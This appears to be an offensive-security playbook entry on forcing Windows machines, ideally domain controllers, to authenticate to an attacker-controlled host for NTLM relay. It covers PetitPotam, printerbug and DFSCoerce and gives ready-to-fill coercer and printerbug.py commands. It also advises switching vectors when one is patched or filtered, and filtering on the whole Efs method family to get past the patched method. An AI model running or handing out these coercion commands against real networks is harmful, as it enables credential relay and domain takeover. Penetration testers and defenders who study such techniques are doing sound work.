Force a machine — ideally a DC — to authenticate to a host you control, then
relay that auth (see `ntlm-relay-ntlmrelayx`). PetitPotam abuses MS-EFSRPC,
printerbug the MS-RPRN spooler, DFSCoerce the MS-DFSNM namespace interface;
`coercer` sprays many vectors at once. Each protocol lands on a different named
pipe (`efsrpc`/`lsarpc`/`samr`/`lsass`/`netlogon`, `spoolss`, `netdfs`
respectively), which is what the paired detection keys on — so if one vector is
patched or filtered, try the others before assuming the target is hardened.
DFSCoerce only works against domain controllers. Two of the three vectors have no
packaged command of their own — there is no `impacket-petitpotam` (PetitPotam is
topotam/PetitPotam; Kali packages no `petitpotam` either), and `dfscoerce` is
Wh04m1001/DFSCoerce, a git clone rather than a binary on PATH. `coercer` implements
both as MS-EFSR and MS-DFSNM, which is why two of the lines below are the same tool
under different filters. Filter EFSRPC on `Efs`, the whole method family, rather than
the single `EfsRpcOpenFileRaw` method, which is patched on a current DC. Here
`{{rhost}}` is the DC being coerced and `{{lhost}}` is your listener.

```sh
coercer coerce -t {{rhost}} -l {{lhost}} -u {{user}} -p {{password}} -d {{domain}} --filter-method-name Efs
printerbug.py {{domain}}/{{user}}:{{password}}@{{rhost}} {{lhost}}
coercer coerce -t {{rhost}} -l {{lhost}} -u {{user}} -p {{password}} -d {{domain}} --filter-protocol-name MS-DFSNM
```
